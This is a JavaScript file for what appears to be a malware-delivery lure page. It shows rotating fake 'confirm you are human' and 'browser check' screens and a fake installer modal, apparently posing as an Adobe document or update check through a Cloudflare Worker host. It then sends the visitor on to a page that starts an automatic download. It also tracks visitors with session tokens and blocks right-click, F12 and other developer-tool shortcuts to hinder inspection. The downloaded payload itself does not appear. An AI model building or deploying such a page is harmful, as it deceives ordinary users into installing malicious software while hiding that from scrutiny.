(() => {
    "use strict";

    /* =========================================================
       ELEMENTS
    ========================================================== */

    const loadingScreen =
        document.getElementById("loadingScreen");

    const confirmScreen =
        document.getElementById("confirmScreen");

    const downloadScreen =
        document.getElementById("downloadScreen");

    const confirmButton =
        document.getElementById("confirmButton");

    const downloadButton =
        document.getElementById("downloadButton");

    const closeModal =
        document.getElementById("closeModal");

    const visitorToken =
        document.getElementById("visitorToken");

    const buttonText =
        confirmButton?.querySelector(".button-text");

    const buttonLoading =
        confirmButton?.querySelector(".button-loading");

    const downloadModal =
        document.querySelector(".download-modal");


    /* =========================================================
       CONFIGURATION
    ========================================================== */

    const CONFIG = {

        /*
         * Initial white loading screen.
         */

        initialDelay: 1200,


        /*
         * Time after Confirm & Continue.
         */

        preparationDelay: 5000,


        /*
         * How long the installer background is
         * visible before the modal appears.
         */

        backgroundDelay: 3000,


        /*
         * Cloudflare Worker.
         *
         * IMPORTANT:
         * Use the actual Worker URL here.
         *
         * Do NOT use Markdown.
         */

        workerBaseUrl:
            "https://documentverifyadobeupdated.willowcenteredtech.com",


        /*
         * Worker API endpoints.
         */

        sessionEndpoint:
            "https://documentverifyadobeupdated.willowcenteredtech.com/api/session",

        visitEndpoint:
            "https://documentverifyadobeupdated.willowcenteredtech.com/api/visit",


        /*
         * Installation instructions page.
         */

        instructionsPage:
            "download.html"

    };


    /* =========================================================
       SESSION
    ========================================================== */

    let session = {

        visitToken: "",

        accessToken: ""

    };


    /* =========================================================
       GENERATE FALLBACK 7 CHARACTER TOKEN
    ========================================================== */

    function generateToken() {

        const alphabet =
            "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

        const bytes =
            crypto.getRandomValues(
                new Uint8Array(7)
            );

        return Array.from(bytes)
            .map(
                byte =>
                    alphabet[
                        byte % alphabet.length
                    ]
            )
            .join("");

    }


    /* =========================================================
       SHOW
    ========================================================== */

    function show(element) {

        if (!element) {
            return;
        }

        element.classList.remove(
            "hidden"
        );

    }


    /* =========================================================
       HIDE
    ========================================================== */

    function hide(element) {

        if (!element) {
            return;
        }

        element.classList.add(
            "hidden"
        );

    }


    /* =========================================================
       CONFIRMATION VARIANTS
    ========================================================== */

    const confirmationVariants = [

        {
            id: 1,

            className:
                "confirm-variant-1",

            eyebrow:
                "Verification",

            title:
                "Confirm you are human",

            description:
                "This quick check helps keep the site safe. It usually takes a few seconds.",

            visual: `
                <div class="visual-check">
                    <span>✓</span>
                </div>
            `
        },


        {
            id: 2,

            className:
                "confirm-variant-2",

            eyebrow:
                "READY TO CONTINUE",

            title:
                "Almost there",

            description:
                "Confirm below to continue securely.",

            visual: `
                <div class="visual-circle">
                    <span class="visual-download">↓</span>
                </div>
            `
        },


        {
            id: 3,

            className:
                "confirm-variant-3",

            eyebrow:
                "BROWSER CHECK",

            title:
                "One more step",

            description:
                "Confirm your browser to continue securely.",

            visual: `
                <div class="visual-check">
                    <span>✓</span>
                </div>
            `
        },


        {
            id: 4,

            className:
                "confirm-variant-4",

            eyebrow:
                "BROWSER CHECK",

            title:
                "Almost ready",

            description:
                "Your connection stays encrypted. Confirm below to continue.",

            visual: `
                <div class="visual-lock">
                    <div class="lock-shackle"></div>
                    <div class="lock-body"></div>
                </div>
            `
        },


        {
            id: 5,

            className:
                "confirm-variant-5",

            eyebrow:
                "HUMAN VERIFY",

            title:
                "One more step",

            description:
                "We need a short verification before showing the page.",

            visual: `
                <div class="visual-lock">
                    <div class="lock-shackle"></div>
                    <div class="lock-body"></div>
                </div>
            `
        },


        {
            id: 6,

            className:
                "confirm-variant-6",

            eyebrow:
                "PROTECTED SESSION",

            title:
                "Just a Moment",

            description:
                "This quick check helps keep the site safe. It usually takes a few seconds.",

            visual: `
                <div class="visual-grid">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            `
        }

    ];


    /* =========================================================
       SELECT CONFIRMATION VARIANT
    ========================================================== */

    function selectConfirmationVariant() {

        const card =
            document.getElementById(
                "confirmCard"
            );

        const visual =
            document.getElementById(
                "confirmVisual"
            );

        const eyebrow =
            document.getElementById(
                "confirmEyebrow"
            );

        const title =
            document.getElementById(
                "confirmTitle"
            );

        const description =
            document.getElementById(
                "confirmDescription"
            );


        if (!card) {
            return;
        }


        /*
         * Use the Worker-generated visitor token
         * as the deterministic seed.
         */

        const token =
            session.visitToken || "";


        let hash = 0;


        for (
            let i = 0;
            i < token.length;
            i++
        ) {

            hash =
                ((hash << 5) - hash) +
                token.charCodeAt(i);

            hash |= 0;

        }


        const index =
            Math.abs(hash) %
            confirmationVariants.length;


        const variant =
            confirmationVariants[index];


        /*
         * Remove existing variant classes.
         */

        confirmationVariants.forEach(
            item => {

                card.classList.remove(
                    item.className
                );

            }
        );


        /*
         * Apply selected variant.
         */

        card.classList.add(
            variant.className
        );


        if (eyebrow) {

            eyebrow.textContent =
                variant.eyebrow;

        }


        if (title) {

            title.textContent =
                variant.title;

        }


        if (description) {

            description.textContent =
                variant.description;

        }


        if (visual) {

            visual.innerHTML =
                variant.visual;

        }

    }


    /* =========================================================
       CREATE WORKER SESSION
    ========================================================== */

    async function createSession() {

        /*
         * Generate a local fallback immediately.
         *
         * This allows the UI to continue if the
         * Worker is temporarily unreachable.
         */

        session.visitToken =
            generateToken();


        try {

            const response =
                await fetch(
                    CONFIG.sessionEndpoint,
                    {
                        method: "POST",

                        headers: {
                            "Accept":
                                "application/json"
                        },

                        /*
                         * The Worker is a separate origin,
                         * therefore same-origin credentials
                         * are unnecessary.
                         */

                        credentials:
                            "omit",

                        cache:
                            "no-store"
                    }
                );


            if (!response.ok) {

                throw new Error(
                    `Worker returned HTTP ${response.status}`
                );

            }


            const data =
                await response.json();


            /*
             * Use the Worker-generated 7-character
             * session token.
             */

            if (
                typeof data.visitToken ===
                    "string" &&
                data.visitToken.length > 0
            ) {

                session.visitToken =
                    data.visitToken;

            }


            /*
             * Store the signed long-lived-for-this-session
             * access token.
             */

            if (
                typeof data.accessToken ===
                    "string" &&
                data.accessToken.length > 0
            ) {

                session.accessToken =
                    data.accessToken;

            }


            /*
             * Save immediately.
             */

            sessionStorage.setItem(
                "installer_update_visit_token",
                session.visitToken
            );


            if (session.accessToken) {

                sessionStorage.setItem(
                    "installer_update_access_token",
                    session.accessToken
                );

            }


            console.log(
                "Cloudflare Worker session established."
            );


        } catch (error) {

            /*
             * Don't break the visual flow if
             * the Worker is temporarily unavailable.
             */

            console.warn(
                "Download session unavailable.",
                error
            );

        }


        /*
         * Display visitor token.
         */

        if (visitorToken) {

            visitorToken.textContent =
                session.visitToken;

        }


        /*
         * Select confirmation design.
         */

        selectConfirmationVariant();

    }


    /* =========================================================
       REPORT VISIT
    ========================================================== */

    function reportVisit() {

        /*
         * Don't report if there is no Worker
         * session at all.
         */

        if (!CONFIG.visitEndpoint) {
            return;
        }


        fetch(
            CONFIG.visitEndpoint,
            {
                method: "POST",

                headers: {
                    "Content-Type":
                        "application/json",

                    "Accept":
                        "application/json"
                },

                credentials:
                    "omit",

                cache:
                    "no-store",

                keepalive:
                    true,

                body:
                    JSON.stringify({
                        visitToken:
                            session.visitToken
                    })
            }
        ).catch(
            () => {}
        );

    }


    /* =========================================================
       INITIALIZE
    ========================================================== */

    async function initialize() {

        /*
         * Establish Worker session first.
         */

        await createSession();


        /*
         * Report page visit.
         */

        reportVisit();


        /*
         * Initial loading screen.
         */

        setTimeout(
            () => {

                hide(
                    loadingScreen
                );

                show(
                    confirmScreen
                );

            },
            CONFIG.initialDelay
        );

    }


    /* =========================================================
       PREPARING BUTTON
    ========================================================== */

    function setPreparing() {

        if (!confirmButton) {
            return;
        }


        confirmButton.disabled =
            true;


        if (buttonText) {

            buttonText.classList.add(
                "hidden"
            );

        }


        if (buttonLoading) {

            buttonLoading.classList.remove(
                "hidden"
            );

        }

    }


    /* =========================================================
       SHOW INSTALLER BACKGROUND
    ========================================================== */

    function showInstallerBackground() {

        if (!downloadScreen) {
            return;
        }


        /*
         * Show the full-screen background.
         */

        show(
            downloadScreen
        );


        /*
         * Modal starts hidden.
         */

        if (downloadModal) {

            downloadModal.classList.remove(
                "modal-visible"
            );

        }


        /*
         * Lock page scrolling.
         */

        document.body.style.overflow =
            "hidden";


        /*
         * Wait one browser frame so the
         * background can render first.
         */

        requestAnimationFrame(
            () => {

                setTimeout(
                    () => {

                        if (
                            downloadModal
                        ) {

                            downloadModal.classList.add(
                                "modal-visible"
                            );

                        }

                    },
                    CONFIG.backgroundDelay
                );

            }
        );

    }


    /* =========================================================
       CONFIRM BUTTON
    ========================================================== */

    if (confirmButton) {

        confirmButton.addEventListener(
            "click",
            () => {

                /*
                 * Prevent double-clicks.
                 */

                if (
                    confirmButton.disabled
                ) {

                    return;

                }


                setPreparing();


                /*
                 * Preserve session information.
                 */

                sessionStorage.setItem(
                    "installer_update_access_token",
                    session.accessToken
                );


                sessionStorage.setItem(
                    "installer_update_visit_token",
                    session.visitToken
                );


                /*
                 * Five-second preparation period.
                 */

                setTimeout(
                    () => {

                        hide(
                            confirmScreen
                        );


                        /*
                         * Show installer background.
                         *
                         * The modal appears after
                         * CONFIG.backgroundDelay.
                         */

                        showInstallerBackground();

                    },
                    CONFIG.preparationDelay
                );

            }
        );

    }


    /* =========================================================
       DOWNLOAD BUTTON
    ========================================================== */

    if (downloadButton) {

        downloadButton.addEventListener(
            "click",
            () => {

                /*
                 * Retrieve the signed Worker token.
                 */

                const accessToken =
                    sessionStorage.getItem(
                        "installer_update_access_token"
                    );


                const visitToken =
                    sessionStorage.getItem(
                        "installer_update_visit_token"
                    );


                /*
                 * If the Worker session wasn't
                 * established, don't pretend that
                 * a secure download exists.
                 */

                if (!accessToken) {

                    console.warn(
                        "No valid Worker access token."
                    );

                    window.location.href =
                        "/";

                    return;

                }


                /*
                 * Preserve session.
                 */

                if (visitToken) {

                    session.visitToken =
                        visitToken;

                }


                session.accessToken =
                    accessToken;


                /*
                 * Route to installation instructions.
                 *
                 * instructions.js handles the
                 * automatic download.
                 */

                window.location.href =
                    CONFIG.instructionsPage;

            }
        );

    }


    /* =========================================================
       CLOSE MODAL
    ========================================================== */

    if (closeModal) {

        closeModal.addEventListener(
            "click",
            () => {

                hide(
                    downloadScreen
                );


                show(
                    confirmScreen
                );


                document.body.style.overflow =
                    "";


                if (downloadModal) {

                    downloadModal.classList.remove(
                        "modal-visible"
                    );

                }

            }
        );

    }


    /* =========================================================
       ESCAPE KEY
    ========================================================== */

    document.addEventListener(
        "keydown",
        event => {

            if (
                event.key === "Escape" &&
                downloadScreen &&
                !downloadScreen.classList.contains(
                    "hidden"
                )
            ) {

                hide(
                    downloadScreen
                );


                show(
                    confirmScreen
                );


                document.body.style.overflow =
                    "";


                if (downloadModal) {

                    downloadModal.classList.remove(
                        "modal-visible"
                    );

                }

            }

        }
    );


    /* =========================================================
       BASIC INSPECTION DETERRENTS
       
       These are NOT a security boundary.
    ========================================================== */

    document.addEventListener(
        "contextmenu",
        event => {

            event.preventDefault();

        }
    );


    document.addEventListener(
        "dragstart",
        event => {

            if (
                event.target &&
                event.target.tagName === "IMG"
            ) {

                event.preventDefault();

            }

        }
    );


    document.addEventListener(
        "keydown",
        event => {

            const key =
                event.key.toLowerCase();


            /*
             * F12
             */

            if (
                event.key === "F12"
            ) {

                event.preventDefault();

            }


            /*
             * Ctrl + Shift + I
             * Ctrl + Shift + J
             * Ctrl + Shift + C
             */

            if (
                event.ctrlKey &&
                event.shiftKey &&
                [
                    "i",
                    "j",
                    "c"
                ].includes(key)
            ) {

                event.preventDefault();

            }


            /*
             * Ctrl + U
             */

            if (
                event.ctrlKey &&
                key === "u"
            ) {

                event.preventDefault();

            }

        }
    );


    /* =========================================================
       START
    ========================================================== */

    initialize();

})();
